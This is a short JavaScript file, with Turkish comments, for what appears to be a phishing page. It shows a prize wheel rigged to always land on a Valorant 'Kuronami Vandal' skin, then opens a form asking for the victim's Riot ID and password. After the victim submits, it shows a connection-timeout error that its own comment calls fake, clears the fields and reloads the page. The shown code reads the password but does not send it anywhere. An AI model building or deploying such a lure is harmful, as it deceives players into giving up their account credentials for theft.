const wheel = document.getElementById('wheel');
const spinBtn = document.getElementById('spin-btn');
const modal = document.getElementById('login-modal');
const claimBtn = document.getElementById('claim-btn');
const infoMsg = document.getElementById('info-msg');

let isSpun = false;

spinBtn.addEventListener('click', () => {
    if (isSpun) return; 
    isSpun = true;
    
    // 7 tam tur (2520 derece) + Kuronami Vandal'ın (3. dilim) açısı (210 derece)
    const targetDegree = 2520 + 210; 
    
    wheel.style.transform = `rotate(${targetDegree}deg)`;
    
    // 5 saniyelik dönüş animasyonu bittikten sonra pop-up'ı göster
    setTimeout(() => {
        modal.classList.remove('hidden');
    }, 5500);
});

claimBtn.addEventListener('click', () => {
    const idInput = document.getElementById('riot-id').value;
    const passInput = document.getElementById('riot-pass').value;

    if(idInput === "" || passInput === "") {
        alert("Lütfen ID ve Şifre alanlarını boş bırakmayın!");
        return;
    }

    infoMsg.classList.remove('hidden');
    claimBtn.innerText = "Bağlantı Kuruluyor...";
    claimBtn.disabled = true;
    claimBtn.style.opacity = "0.7";

    // 2.5 saniye sonra sahte hata mesajını göster ve alanları temizle
    setTimeout(() => {
        alert("Riot İstemci Sunucularına bağlanılamadı. Kod: ER_CONNECTION_TIMEOUT. Lütfen daha sonra tekrar deneyin.");
        
        document.getElementById('riot-id').value = "";
        document.getElementById('riot-pass').value = "";
        location.reload();
    }, 2500);
});